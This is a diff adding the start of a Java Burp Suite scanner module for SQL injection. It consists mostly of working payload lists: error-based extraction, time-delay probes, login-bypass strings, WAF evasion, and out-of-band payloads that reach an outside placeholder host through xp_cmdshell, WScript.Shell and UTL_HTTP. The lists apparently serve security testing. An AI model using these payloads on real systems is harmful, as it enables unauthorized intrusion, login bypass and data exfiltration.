@@ -1,0 +1,1632 @@
+package com.omnistrike.modules.injection;
+
+import burp.api.montoya.MontoyaApi;
+import burp.api.montoya.collaborator.Interaction;
+import burp.api.montoya.http.message.HttpRequestResponse;
+import burp.api.montoya.http.message.requests.HttpRequest;
+import burp.api.montoya.http.message.responses.HttpResponse;
+import com.omnistrike.framework.CollaboratorManager;
+import com.omnistrike.framework.DeduplicationStore;
+import com.omnistrike.framework.FindingsStore;
+
+import com.omnistrike.model.*;
+
+import java.net.URLEncoder;
+import java.nio.charset.StandardCharsets;
+import java.util.*;
+import java.util.concurrent.ConcurrentHashMap;
+import java.util.concurrent.atomic.AtomicReference;
+import java.util.regex.Matcher;
+import java.util.regex.Pattern;
+
+/**
+ * MODULE 5: Smart SQLi Detector
+ * Comprehensive SQL injection detection covering error-based, union-based,
+ * time-based blind, boolean-based blind, and OOB (Burp Collaborator) techniques.
+ * 6 detection phases with configurable toggles for each.
+ */
+public class SmartSqliDetector implements ScanModule {
+
+    private MontoyaApi api;
+    private ModuleConfig config;
+    private DeduplicationStore dedup;
+    private FindingsStore findingsStore;
+    private CollaboratorManager collaboratorManager;
+
+    // Tested parameters tracking
+    private final ConcurrentHashMap<String, Boolean> tested = new ConcurrentHashMap<>();
+
+    // SQL error patterns by DB type
+    private static final Map<String, List<Pattern>> ERROR_PATTERNS = new LinkedHashMap<>();
+
+    static {
+        ERROR_PATTERNS.put("MySQL", List.of(
+                Pattern.compile("SQL syntax.*?MySQL", Pattern.CASE_INSENSITIVE),
+                Pattern.compile("mysql_fetch", Pattern.CASE_INSENSITIVE),
+                Pattern.compile("mysql_num_rows", Pattern.CASE_INSENSITIVE),
+                Pattern.compile("MySQL server version", Pattern.CASE_INSENSITIVE),
+                Pattern.compile("mysqli_", Pattern.CASE_INSENSITIVE),
+                Pattern.compile("You have an error in your SQL syntax", Pattern.CASE_INSENSITIVE),
+                Pattern.compile("MariaDB server version", Pattern.CASE_INSENSITIVE)
+        ));
+        ERROR_PATTERNS.put("PostgreSQL", List.of(
+                Pattern.compile("PostgreSQL.*?ERROR", Pattern.CASE_INSENSITIVE),
+                Pattern.compile("pg_query", Pattern.CASE_INSENSITIVE),
+                Pattern.compile("pg_exec", Pattern.CASE_INSENSITIVE),
+                Pattern.compile("valid PostgreSQL result", Pattern.CASE_INSENSITIVE),
+                Pattern.compile("unterminated quoted string", Pattern.CASE_INSENSITIVE),
+                Pattern.compile("PSQLException", Pattern.CASE_INSENSITIVE)
+        ));
+        ERROR_PATTERNS.put("MSSQL", List.of(
+                Pattern.compile("Microsoft SQL", Pattern.CASE_INSENSITIVE),
+                Pattern.compile("ODBC SQL Server", Pattern.CASE_INSENSITIVE),
+                Pattern.compile("SQLServer JDBC", Pattern.CASE_INSENSITIVE),
+                Pattern.compile("Unclosed quotation mark", Pattern.CASE_INSENSITIVE),
+                Pattern.compile("mssql_query", Pattern.CASE_INSENSITIVE),
+                Pattern.compile("Microsoft OLE DB Provider", Pattern.CASE_INSENSITIVE)
+        ));
+        ERROR_PATTERNS.put("Oracle", List.of(
+                Pattern.compile("ORA-\\d{5}", Pattern.CASE_INSENSITIVE),
+                Pattern.compile("Oracle error", Pattern.CASE_INSENSITIVE),
+                Pattern.compile("quoted string not properly terminated", Pattern.CASE_INSENSITIVE),
+                Pattern.compile("oracle\\.jdbc", Pattern.CASE_INSENSITIVE)
+        ));
+        ERROR_PATTERNS.put("SQLite", List.of(
+                Pattern.compile("SQLite.*?error", Pattern.CASE_INSENSITIVE),
+                Pattern.compile("sqlite3\\.OperationalError", Pattern.CASE_INSENSITIVE),
+                Pattern.compile("SQLITE_ERROR", Pattern.CASE_INSENSITIVE),
+                Pattern.compile("unrecognized token", Pattern.CASE_INSENSITIVE)
+        ));
+        ERROR_PATTERNS.put("DB2", List.of(
+                Pattern.compile("DB2 SQL error", Pattern.CASE_INSENSITIVE),
+                Pattern.compile("SQLCODE=-\\d+", Pattern.CASE_INSENSITIVE),
+                Pattern.compile("com\\.ibm\\.db2", Pattern.CASE_INSENSITIVE),
+                Pattern.compile("CLI Driver.*?DB2", Pattern.CASE_INSENSITIVE)
+        ));
+        ERROR_PATTERNS.put("Sybase", List.of(
+                Pattern.compile("Sybase message", Pattern.CASE_INSENSITIVE),
+                Pattern.compile("Adaptive Server Enterprise", Pattern.CASE_INSENSITIVE),
+                Pattern.compile("sybsystemprocs", Pattern.CASE_INSENSITIVE)
+        ));
+        ERROR_PATTERNS.put("Informix", List.of(
+                Pattern.compile("com\\.informix\\.jdbc", Pattern.CASE_INSENSITIVE),
+                Pattern.compile("INFORMIX-SQL", Pattern.CASE_INSENSITIVE),
+                Pattern.compile("ifx_", Pattern.CASE_INSENSITIVE)
+        ));
+        ERROR_PATTERNS.put("Firebird", List.of(
+                Pattern.compile("Dynamic SQL Error", Pattern.CASE_INSENSITIVE),
+                Pattern.compile("Firebird.*?error", Pattern.CASE_INSENSITIVE),
+                Pattern.compile("isc_dsql_error", Pattern.CASE_INSENSITIVE)
+        ));
+        ERROR_PATTERNS.put("CockroachDB", List.of(
+                Pattern.compile("cockroach.*?error", Pattern.CASE_INSENSITIVE),
+                Pattern.compile("CRDB", Pattern.CASE_INSENSITIVE)
+        ));
+        ERROR_PATTERNS.put("Generic", List.of(
+                Pattern.compile("syntax error.*?SQL", Pattern.CASE_INSENSITIVE),
+                Pattern.compile("unexpected end of SQL", Pattern.CASE_INSENSITIVE),
+                Pattern.compile("SQLSTATE\\[", Pattern.CASE_INSENSITIVE),
+                Pattern.compile("Warning.*?\\b(sql|query|fetch|num_rows)\\b", Pattern.CASE_INSENSITIVE),
+                Pattern.compile("Syntax error or access violation", Pattern.CASE_INSENSITIVE),
+                Pattern.compile("Unclosed quotation mark", Pattern.CASE_INSENSITIVE),
+                Pattern.compile("quoted string not properly terminated", Pattern.CASE_INSENSITIVE),
+                Pattern.compile("SQL command not properly ended", Pattern.CASE_INSENSITIVE),
+                Pattern.compile("invalid input syntax for", Pattern.CASE_INSENSITIVE),
+                Pattern.compile("near \".*?\": syntax error", Pattern.CASE_INSENSITIVE),
+                Pattern.compile("PDOException", Pattern.CASE_INSENSITIVE),
+                Pattern.compile("java\\.sql\\.SQLException", Pattern.CASE_INSENSITIVE),
+                Pattern.compile("System\\.Data\\.SqlClient", Pattern.CASE_INSENSITIVE),
+                Pattern.compile("Npgsql\\.PostgresException", Pattern.CASE_INSENSITIVE),
+                Pattern.compile("org\\.hibernate", Pattern.CASE_INSENSITIVE),
+                Pattern.compile("jdbc\\.SQLServerException", Pattern.CASE_INSENSITIVE),
+                Pattern.compile("\\bSQLException\\b", Pattern.CASE_INSENSITIVE),
+                Pattern.compile("\\bDatabaseError\\b", Pattern.CASE_INSENSITIVE),
+                Pattern.compile("\\bOperationalError\\b", Pattern.CASE_INSENSITIVE),
+                Pattern.compile("\\bProgrammingError\\b", Pattern.CASE_INSENSITIVE),
+                Pattern.compile("\\bDataError\\b", Pattern.CASE_INSENSITIVE),
+                Pattern.compile("\\bIntegrityError\\b", Pattern.CASE_INSENSITIVE),
+                Pattern.compile("division by zero", Pattern.CASE_INSENSITIVE),
+                Pattern.compile("supplied argument is not a valid", Pattern.CASE_INSENSITIVE),
+                Pattern.compile("Column count doesn't match", Pattern.CASE_INSENSITIVE),
+                Pattern.compile("Unknown column", Pattern.CASE_INSENSITIVE),
+                Pattern.compile("Table .* doesn't exist", Pattern.CASE_INSENSITIVE),
+                Pattern.compile("Data truncated for column", Pattern.CASE_INSENSITIVE),
+                Pattern.compile("Duplicate entry", Pattern.CASE_INSENSITIVE)
+        ));
+    }
+
+    // Error-based payloads
+    private static final String[] ERROR_PAYLOADS = {
+            // Basic quote/syntax probes
+            "'", "''", "\"", "\\", "`",
+            "' -- -", "\" -- -",
+            "';", "\";",
+            // Classic OR/AND probes
+            "1 OR 1=1", "1' OR '1'='1", "1; --",
+            "' OR ''='", "1' OR 1=1-- -", "1\" OR 1=1-- -",
+            // CONVERT/CAST error extraction (MSSQL)
+            "1' AND 1=CONVERT(int,(SELECT @@version))-- -",
+            "1' AND 1=CONVERT(int,(SELECT DB_NAME()))-- -",
+            "1' AND 1=CONVERT(int,(SELECT user))-- -",
+            "1 AND 1=CONVERT(int,(SELECT @@version))-- -",
+            // CAST error extraction (PostgreSQL/MSSQL)
+            "1' AND 1=CAST((SELECT version()) AS int)-- -",
+            "1' AND CAST((SELECT 1) AS int)=1-- -",
+            "1 AND 1=CAST('a' AS int)-- -",
+            // Basic UNION probe
+            "' UNION SELECT NULL-- -",
+            // MySQL extractvalue/updatexml error extraction
+            "' AND extractvalue(1,concat(0x7e,version()))-- -",
+            "' AND updatexml(1,concat(0x7e,version()),1)-- -",
+            "1' AND extractvalue(1,concat(0x7e,(SELECT user())))-- -",
+            "1' AND updatexml(1,concat(0x7e,(SELECT database())),1)-- -",
+            // MySQL EXP overflow (MySQL 5.5.5+)
+            "' AND EXP(~(SELECT * FROM (SELECT version())a))-- -",
+            // MySQL GTID_SUBSET error
+            "' AND GTID_SUBSET(version(),0)-- -",
+            // MySQL JSON error extraction (5.7+)
+            "' AND JSON_KEYS((SELECT CONVERT((SELECT version()) USING utf8)))-- -",
+            // MySQL geometry functions error
+            "' AND ST_LatFromGeoHash(version())-- -",
+            "' AND ST_LongFromGeoHash(version())-- -",
+            // PostgreSQL error extraction
+            "' AND 1=1/(SELECT 0 FROM pg_sleep(0))-- -",
+            "1' AND 1::int=2::text-- -",
+            // Oracle error extraction
+            "' AND 1=UTL_INADDR.GET_HOST_NAME((SELECT banner FROM v$version WHERE ROWNUM=1))-- -",
+            "' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT banner FROM v$version WHERE ROWNUM=1))-- -",
+            "' AND 1=DBMS_UTILITY.SQLID_TO_SQLHASH((SELECT banner FROM v$version WHERE ROWNUM=1))-- -",
+            // SQLite error extraction
+            "' AND 1=LOAD_EXTENSION('a')-- -",
+            // Space bypass via comment, newline, plus, tab
+            "1'/**/OR/**/1=1-- -",
+            "1'%0aOR%0a1=1-- -",
+            "1'+OR+1=1-- -",
+            "1'%09OR%091=1-- -",
+            "1'%0bOR%0b1=1-- -",
+            "1'%0cOR%0c1=1-- -",
+            "1'%a0OR%a01=1-- -",
+            // Stacked query probes
+            "1';SELECT+1-- -",
+            "1\";SELECT+1-- -",
+            "1;SELECT 1-- -",
+            // Parenthetical grouping
+            "1')OR('1'='1",
+            "1'))OR(('1'='1",
+            "1') OR 1=1-- -",
+            "1')) OR 1=1-- -",
+            "1') AND ('1'='1",
+            "1%') OR 1=1-- -",
+            // Backslash escape variants (MySQL NO_BACKSLASH_ESCAPES)
+            "\\'", "\\\\'",
+            // Null byte
+            "%00'",
+            // Wildcard LIKE probe
+            "' LIKE '",
+            "' NOT LIKE '",
+            // Math/arithmetic error probes
+            "1/0", "' OR 1/0-- -",
+            "1' AND 1/0-- -",
+            // HAVING/GROUP BY error extraction
+            "' HAVING 1=1-- -",
+            "' GROUP BY 1 HAVING 1=1-- -",
+            "1' ORDER BY 1,SLEEP(0)-- -",
+            // MySQL INTO error
+            "' INTO @a-- -",
+            "' INTO OUTFILE '/dev/null'-- -",
+            // Double-query error injection
+            "1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -",
+            // MSSQL specific
+            "1' AND 1=@@SERVERNAME-- -",
+            "1'; EXEC xp_msver-- -",
+            // Inline comment injection
+            "1'/*!50000OR*/1=1-- -",
+            "1'/*!OR*/1=1-- -",
+            // Scientific notation edge case
+            "1e0' OR '1'='1",
+            "1e0\" OR \"1\"=\"1",
+    };
+
+    // Time-based payloads by DB
+    private static final Map<String, String[]> TIME_PAYLOADS;
+    static {
+        Map<String, String[]> tp = new LinkedHashMap<>();
+        tp.put("MySQL", new String[]{
+                // Basic SLEEP
+                "' OR SLEEP(5)-- -", "1' AND SLEEP(5)-- -", "\" OR SLEEP(5)-- -",
+                "1 AND SLEEP(5)-- -", "' OR SLEEP(5)#",
+                // Comment-as-space bypass
+                "'/**/OR/**/SLEEP(5)#",
+                "1'/**/AND/**/SLEEP(5)-- -",
+                // Conditional SLEEP with IF
+                "' AND IF(1=1,SLEEP(5),0)-- -",
+                "' AND IF(1=1,SLEEP(5),0)#",
+                "1' AND IF(1=1,SLEEP(5),0)-- -",
+                "\" AND IF(1=1,SLEEP(5),0)-- -",
+                "1 AND IF(1=1,SLEEP(5),0)-- -",
+                // Conditional SLEEP with CASE
+                "' AND (CASE WHEN 1=1 THEN SLEEP(5) ELSE 0 END)-- -",
+                "1' AND (CASE WHEN 1=1 THEN SLEEP(5) ELSE 0 END)-- -",
+                // Subquery wrapper (WAF bypass)
+                "' AND (SELECT SLEEP(5))-- -",
+                "1' AND (SELECT SLEEP(5))-- -",
+                "' AND (SELECT * FROM (SELECT SLEEP(5))a)-- -",
+                "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)-- -",
+                // BENCHMARK alternative (when SLEEP is disabled)
+                "' AND BENCHMARK(10000000,SHA1('test'))-- -",
+                "1' AND BENCHMARK(10000000,SHA1('test'))-- -",
+                "' AND BENCHMARK(5000000,MD5('test'))-- -",
+                // SLEEP in UNION
+                "' UNION SELECT SLEEP(5)-- -",
+                "' UNION SELECT SLEEP(5),NULL-- -",
+                // Parenthetical grouping
+                "') OR SLEEP(5)-- -",
+                "')) OR SLEEP(5)-- -",
+                "') AND SLEEP(5)-- -",
+                // Inline comment bypass
+                "'/*!50000AND*/SLEEP(5)-- -",
+                "'/*!SLEEP(5)*/-- -",
+                // Newline bypass
+                "'%0aOR%0aSLEEP(5)-- -",
+                // ELT/MAKE_SET based (alternative delay)
+                "' AND ELT(1=1,SLEEP(5))-- -",
+                // Stacked query with SLEEP
+                "'; SELECT SLEEP(5)-- -",
+                "1'; SELECT SLEEP(5)-- -",
+        });
+        tp.put("PostgreSQL", new String[]{
+                // Basic PG_SLEEP
+                "'; SELECT PG_SLEEP(5)-- -", "1'; SELECT PG_SLEEP(5)-- -",
+                "' || (SELECT PG_SLEEP(5))-- -",
+                // Comment-as-space bypass
+                "';/**/SELECT/**/PG_SLEEP(5)-- -",
+                // Conditional PG_SLEEP with CASE
+                "' AND (CASE WHEN 1=1 THEN (SELECT PG_SLEEP(5)) END) IS NOT NULL-- -",
+                "1' AND (CASE WHEN 1=1 THEN (SELECT PG_SLEEP(5)) END) IS NOT NULL-- -",
+                "' AND CASE WHEN 1=1 THEN CAST((SELECT PG_SLEEP(5)) AS text) ELSE '0' END='0'-- -",
+                // Subquery wrapper
+                "' AND (SELECT PG_SLEEP(5)) IS NOT NULL-- -",
+                "1' AND (SELECT PG_SLEEP(5)) IS NOT NULL-- -",
+                "' AND 1=(SELECT 1 FROM PG_SLEEP(5))-- -",
+                // Stacked query variants
+                "\"; SELECT PG_SLEEP(5)-- -",
+                "1; SELECT PG_SLEEP(5)-- -",
+                // generate_series based delay
+                "'; SELECT COUNT(*) FROM generate_series(1,10000000)-- -",
+                // Parenthetical grouping
+                "'); SELECT PG_SLEEP(5)-- -",
+                "')); SELECT PG_SLEEP(5)-- -",
+                // PG_SLEEP in WHERE
+                "' AND PG_SLEEP(5)::text='1'-- -",
+        });
+        tp.put("MSSQL", new String[]{
+                // Basic WAITFOR DELAY
+                "'; WAITFOR DELAY '0:0:5'-- -", "1'; WAITFOR DELAY '0:0:5'-- -",
+                "' WAITFOR DELAY '0:0:5'-- -",
+                // Comment-as-space bypass
+                "';/**/WAITFOR/**/DELAY/**/'0:0:5'-- -",
+                // Double quote variant
+                "\"; WAITFOR DELAY '0:0:5'-- -",
+                // No-quote (integer injection)
+                "1; WAITFOR DELAY '0:0:5'-- -",
+                // Conditional WAITFOR with IF
+                "'; IF(1=1) WAITFOR DELAY '0:0:5'-- -",
+                "1'; IF(1=1) WAITFOR DELAY '0:0:5'-- -",
+                "'; IF 1=1 WAITFOR DELAY '0:0:5'-- -",
+                // Conditional with CASE
+                "'; DECLARE @d VARCHAR(10);SET @d=CASE WHEN 1=1 THEN '0:0:5' ELSE '0:0:0' END;WAITFOR DELAY @d-- -",
+                // Stacked query variants
+                "1; WAITFOR DELAY '0:0:5'-- -",
+                // Parenthetical grouping
+                "'); WAITFOR DELAY '0:0:5'-- -",
+                "')); WAITFOR DELAY '0:0:5'-- -",
+                // WAITFOR TIME (wait until a time, less common but works)
+                "'; WAITFOR DELAY '00:00:05'-- -",
+                // Heavy query alternative (no WAITFOR needed)
+                "' AND (SELECT COUNT(*) FROM sysusers AS a CROSS JOIN sysusers AS b CROSS JOIN sysusers AS c)>0-- -",
+        });
+        tp.put("SQLite", new String[]{
+                // RANDOMBLOB heavy computation
+                "' AND 1=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))-- -",
+                "1 AND 1=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))-- -",
+                "\" AND 1=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))-- -",
+                // Alternative heavy computation
+                "' AND 1=LIKE('A',UPPER(HEX(RANDOMBLOB(1000000000/2))))-- -",
+                // ZEROBLOB variant
+                "' AND 1=LIKE('A',HEX(ZEROBLOB(500000000)))-- -",
+        });
+        tp.put("Oracle", new String[]{
+                // DBMS_PIPE.RECEIVE_MESSAGE
+                "' OR 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)-- -",
+                "1' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)-- -",
+                "' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)-- -",
+                // Conditional with CASE
+                "' AND CASE WHEN 1=1 THEN DBMS_PIPE.RECEIVE_MESSAGE('a',5) ELSE 0 END=1-- -",
+                // DBMS_LOCK.SLEEP (requires DBA privilege)
+                "'; BEGIN DBMS_LOCK.SLEEP(5); END;-- -",
+                "1'; BEGIN DBMS_LOCK.SLEEP(5); END;-- -",
+                // UTL_INADDR heavy DNS lookup
+                "' AND 1=UTL_INADDR.GET_HOST_ADDRESS('10.0.0.1')-- -",
+                // Heavy query (cross join)
+                "' AND 1=(SELECT COUNT(*) FROM all_objects a, all_objects b WHERE ROWNUM<=10000000)-- -",
+                // DBMS_SESSION.SLEEP (12c+)
+                "'; BEGIN DBMS_SESSION.SLEEP(5); END;-- -",
+                // httpuritype timeout
+                "' AND 1=HTTPURITYPE('http://10.255.255.1/').GETCLOB()-- -",
+        });
+        TIME_PAYLOADS = Collections.unmodifiableMap(tp);
+    }
+
+    // Boolean-based payload pairs: [true, false]
+    private static final String[][] BOOLEAN_PAIRS = {
+            // Basic single-quote AND
+            {"1' AND '1'='1", "1' AND '1'='2"},
+            // Integer AND
+            {"1 AND 1=1", "1 AND 1=2"},
+            // Single-quote OR
+            {"' OR '1'='1' -- -", "' OR '1'='2' -- -"},
+            // Integer OR
+            {"1 OR 1=1", "1 OR 1=2"},
+            // Double-quote AND
+            {"1\" AND \"1\"=\"1", "1\" AND \"1\"=\"2"},
+            // Comment-as-space bypass
+            {"1'/**/AND/**/'1'='1", "1'/**/AND/**/'1'='2"},
+            {"1'/**/OR/**/'1'='1", "1'/**/OR/**/'1'='2"},
+            // Parenthetical grouping
+            {"1')AND('1'='1", "1')AND('1'='2"},
+            {"1'))AND(('1'='1", "1'))AND(('1'='2"},
+            {"1') AND 1=1-- -", "1') AND 1=2-- -"},
+            // Bare AND with comment terminator
+            {"1 AND 1=1-- -", "1 AND 1=2-- -"},
+            // LIKE-based
+            {"1' AND 'a' LIKE 'a", "1' AND 'a' LIKE 'b"},
+            {"' OR 'a' LIKE 'a' -- -", "' OR 'a' LIKE 'b' -- -"},
+            // BETWEEN-based
+            {"1' AND 1 BETWEEN 1 AND 1-- -", "1' AND 1 BETWEEN 2 AND 3-- -"},
+            // Regex-based (MySQL)
+            {"1' AND 'a' REGEXP 'a'-- -", "1' AND 'a' REGEXP 'b'-- -"},
+            // SIMILAR TO (PostgreSQL)
+            {"1' AND 'a' SIMILAR TO 'a'-- -", "1' AND 'a' SIMILAR TO 'b'-- -"},
+            // Subtraction-based (no quotes needed)
+            {"1 AND 1-1=0", "1 AND 1-1=1"},
+            {"1' AND 1-1=0-- -", "1' AND 1-1=1-- -"},
+            // MOD-based
+            {"1' AND MOD(1,1)=0-- -", "1' AND MOD(1,1)=1-- -"},
+            // Conditional string comparison
+            {"' AND 'a'='a' -- -", "' AND 'a'='b' -- -"},
+            // NULL comparison
+            {"1' AND NULL IS NULL-- -", "1' AND NULL IS NOT NULL-- -"},
+            // Subquery boolean
+            {"1' AND (SELECT 1)=1-- -", "1' AND (SELECT 1)=2-- -"},
+            {"' OR (SELECT 1)=1-- -", "' OR (SELECT 1)=2-- -"},
+            // SUBSTRING/SUBSTR probes (confirm data extraction)
+            {"1' AND SUBSTRING('a',1,1)='a'-- -", "1' AND SUBSTRING('a',1,1)='b'-- -"},
+            {"1' AND SUBSTR('a',1,1)='a'-- -", "1' AND SUBSTR('a',1,1)='b'-- -"},
+            // ASCII comparison
+            {"1' AND ASCII('a')=97-- -", "1' AND ASCII('a')=98-- -"},
+            // LENGTH/CHAR_LENGTH probe
+            {"1' AND LENGTH('a')=1-- -", "1' AND LENGTH('a')=2-- -"},
+            // ORD probe (MySQL)
+            {"1' AND ORD('a')=97-- -", "1' AND ORD('a')=98-- -"},
+            // MID probe (MySQL)
+            {"1' AND MID('abc',1,1)='a'-- -", "1' AND MID('abc',1,1)='b'-- -"},
+            // LEFT probe
+            {"1' AND LEFT('abc',1)='a'-- -", "1' AND LEFT('abc',1)='b'-- -"},
+            // Inline comment bypass
+            {"1'/*!AND*/'1'='1", "1'/*!AND*/'1'='2"},
+            // Newline bypass
+            {"1'%0aAND%0a'1'='1", "1'%0aAND%0a'1'='2"},
+            // information_schema existence probe
+            {"1' AND (SELECT COUNT(*) FROM information_schema.tables)>=0-- -",
+             "1' AND (SELECT COUNT(*) FROM information_schema.tables)<0-- -"},
+            // Percent wildcard (LIKE injection in search)
+            {"1%' AND '1'='1' -- -", "1%' AND '1'='2' -- -"},
+    };
+
+    // Auth bypass payloads — ORIGINAL_VALUE is replaced with the actual param value
+    private static final String[] AUTH_BYPASS_PAYLOADS = {
+            // Append comment to original value (like PortSwigger lab: administrator'--)
+            "ORIGINAL_VALUE'--",
+            "ORIGINAL_VALUE'-- -",
+            "ORIGINAL_VALUE'#",
+            "ORIGINAL_VALUE\"--",
+            "ORIGINAL_VALUE\"-- -",
+            "ORIGINAL_VALUE\"#",
+            // Append comment with different terminators
+            "ORIGINAL_VALUE')--",
+            "ORIGINAL_VALUE')-- -",
+            "ORIGINAL_VALUE'))--",
+            // Standalone bypass payloads — single quote
+            "' OR 1=1-- -",
+            "' OR 1=1#",
+            "' OR 1=1/*",
+            "' OR '1'='1'-- -",
+            "' OR '1'='1'#",
+            "' OR ''='",
+            "' OR 'x'='x'-- -",
+            "' OR 'a'='a",
+            // Standalone bypass payloads — double quote
+            "\" OR 1=1-- -",
+            "\" OR 1=1#",
+            "\" OR \"1\"=\"1\"-- -",
+            // Parenthetical grouping bypasses
+            "') OR ('1'='1'-- -",
+            "') OR 1=1-- -",
+            "') OR ('1'='1",
+            "')) OR 1=1-- -",
+            "')) OR (('1'='1",
+            // Admin-specific
+            "admin'--",
+            "admin'-- -",
+            "admin'#",
+            "admin\"--",
+            "admin')--",
+            // LIMIT/TOP variants
+            "' OR 1=1 LIMIT 1-- -",
+            "' OR 1=1 LIMIT 1#",
+            "' OR 1=1 LIMIT 1,1-- -",
+            "'; SELECT TOP 1 * FROM users-- -",
+            // UNION-based auth bypass
+            "' UNION SELECT 1-- -",
+            "' UNION SELECT 1,1-- -",
+            "' UNION SELECT 1,1,1-- -",
+            "' UNION SELECT NULL,NULL,NULL-- -",
+            "' UNION SELECT 'admin','password'-- -",
+            // Integer-based auth bypass (no quotes)
+            "1 OR 1=1-- -",
+            "1 OR 1=1#",
+            // Comment-as-space bypass
+            "'/**/OR/**/1=1-- -",
+            "'/**/OR/**/'1'='1'-- -",
+            // Newline bypass
+            "'%0aOR%0a1=1-- -",
+            // True condition bypasses
+            "' OR 2>1-- -",
+            "' OR 'a' LIKE 'a'-- -",
+            "' OR 1 BETWEEN 0 AND 2-- -",
+            "' OR NOT 0-- -",
+            "' OR NOT 1=2-- -",
+            // MySQL specific
+            "' OR 1=1-- -",
+            "' || 1=1-- -",
+            "' && 1=1-- -",
+            // PostgreSQL specific
+            "' OR TRUE-- -",
+            "' OR 1::bool-- -",
+            // MSSQL specific
+            "' OR 1=1;-- -",
+            // Null byte before comment (edge case)
+            "ORIGINAL_VALUE'%00-- -",
+            // Backslash escape (MySQL NO_BACKSLASH_ESCAPES)
+            "\\'OR 1=1-- -",
+    };
+
+    // Parameter names that suggest a login/auth form
+    private static final Set<String> LOGIN_PARAM_NAMES = Set.of(
+            "username", "user", "uname", "login", "email", "userid", "user_id",
+            "user_name", "loginid", "login_id", "account", "usr", "name",
+            "uid", "signin", "sign_in", "log", "logname"
+    );
+
+    // Keywords in response body that indicate successful login
+    private static final String[] SUCCESS_KEYWORDS = {
+            "welcome", "dashboard", "logout", "log out", "sign out", "signout",
+            "my account", "my profile", "profile", "settings", "admin panel",
+            "successfully", "logged in", "authenticated"
+    };
+
+    // Keywords in response body that indicate failed login
+    private static final String[] FAILURE_KEYWORDS = {
+            "invalid", "incorrect", "failed", "wrong", "error", "denied",
+            "unauthorized", "bad credentials", "login failed", "try again",
+            "invalid username", "invalid password", "authentication failed"
+    };
+
+    // OOB payloads by DB type (use COLLAB_PLACEHOLDER for Collaborator domain)
+    private static final Map<String, String[]> OOB_PAYLOADS;
+    static {
+        Map<String, String[]> oob = new LinkedHashMap<>();
+        oob.put("MySQL", new String[]{
+                // LOAD_FILE with UNC path (DNS exfiltration)
+                "' UNION SELECT LOAD_FILE(CONCAT('\\\\\\\\',COLLAB_PLACEHOLDER,'\\\\a'))-- -",
+                "' AND LOAD_FILE(CONCAT('\\\\\\\\',COLLAB_PLACEHOLDER,'\\\\a'))-- -",
+                "1' UNION SELECT LOAD_FILE(CONCAT(0x5c5c5c5c,(SELECT version()),0x2e,COLLAB_PLACEHOLDER,0x5c5c61))-- -",
+                // INTO OUTFILE/DUMPFILE via UNC
+                "' UNION SELECT 'test' INTO OUTFILE '\\\\\\\\COLLAB_PLACEHOLDER\\\\a'-- -",
+                "' UNION SELECT 'test' INTO DUMPFILE '\\\\\\\\COLLAB_PLACEHOLDER\\\\a'-- -",
+                // XML functions
+                "' AND extractvalue(1,concat(0x7e,(SELECT LOAD_FILE(CONCAT('\\\\\\\\',COLLAB_PLACEHOLDER,'\\\\a')))))-- -",
+                "' AND updatexml(1,concat(0x7e,(SELECT LOAD_FILE(CONCAT('\\\\\\\\',COLLAB_PLACEHOLDER,'\\\\a')))),1)-- -",
+        });
+        oob.put("MSSQL", new String[]{
+                // xp_dirtree (most common, enabled by default)
+                "'; EXEC master..xp_dirtree '\\\\COLLAB_PLACEHOLDER\\a'-- -",
+                "'; DECLARE @q VARCHAR(1024);SET @q='\\\\COLLAB_PLACEHOLDER\\a';EXEC master..xp_dirtree @q-- -",
+                // xp_subdirs
+                "' UNION SELECT 1; EXEC master..xp_subdirs '\\\\COLLAB_PLACEHOLDER\\a'-- -",
+                // xp_fileexist
+                "'; EXEC master..xp_fileexist '\\\\COLLAB_PLACEHOLDER\\a'-- -",
+                // xp_cmdshell (if enabled)
+                "'; EXEC xp_cmdshell 'nslookup COLLAB_PLACEHOLDER'-- -",
+                "'; EXEC xp_cmdshell 'ping -n 1 COLLAB_PLACEHOLDER'-- -",
+                // fn_xe_file_target_read_file / bulk insert
+                "'; DECLARE @q VARCHAR(1024);SET @q='\\\\COLLAB_PLACEHOLDER\\a';EXEC master.dbo.xp_dirtree @q,1,1-- -",
+                // OPENROWSET
+                "'; SELECT * FROM OPENROWSET('SQLOLEDB','server=COLLAB_PLACEHOLDER;uid=sa;pwd=sa','SELECT 1')-- -",
+                // sp_OACreate + WScript.Shell (alternative OOB)
+                "'; DECLARE @o INT;EXEC sp_OACreate 'WScript.Shell',@o OUT;EXEC sp_OAMethod @o,'Run','','nslookup COLLAB_PLACEHOLDER'-- -",
+        });
+        oob.put("Oracle", new String[]{
+                // UTL_INADDR (DNS lookup)
+                "'||(SELECT UTL_INADDR.GET_HOST_ADDRESS('COLLAB_PLACEHOLDER'))||'",
+                "' AND 1=UTL_INADDR.GET_HOST_ADDRESS('COLLAB_PLACEHOLDER')-- -",
+                // UTL_HTTP (HTTP request)
+                "'||(SELECT UTL_HTTP.REQUEST('http://COLLAB_PLACEHOLDER/') FROM DUAL)||'",
+                "' AND 1=(SELECT UTL_HTTP.REQUEST('http://COLLAB_PLACEHOLDER/') FROM DUAL)-- -",
+                // HTTPURITYPE
+                "'||(SELECT HTTPURITYPE('http://COLLAB_PLACEHOLDER/').GETCLOB() FROM DUAL)||'",
+                // DBMS_LDAP (LDAP connection)
+                "'||(SELECT DBMS_LDAP.INIT('COLLAB_PLACEHOLDER',80) FROM DUAL)||'",
+                // UTL_TCP (TCP connection)
+                "' AND 1=(SELECT UTL_TCP.OPEN_CONNECTION('COLLAB_PLACEHOLDER',80) FROM DUAL)-- -",
+                // XXE via XMLType
+                "' AND 1=(SELECT extractvalue(xmltype('<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM \"http://COLLAB_PLACEHOLDER/\">%remote;]>'),'/l') FROM DUAL)-- -",
+                // DBMS_XMLGEN
+                "' UNION SELECT DBMS_XMLGEN.getxml('SELECT UTL_INADDR.GET_HOST_ADDRESS(''COLLAB_PLACEHOLDER'') FROM DUAL') FROM DUAL-- -",
+        });
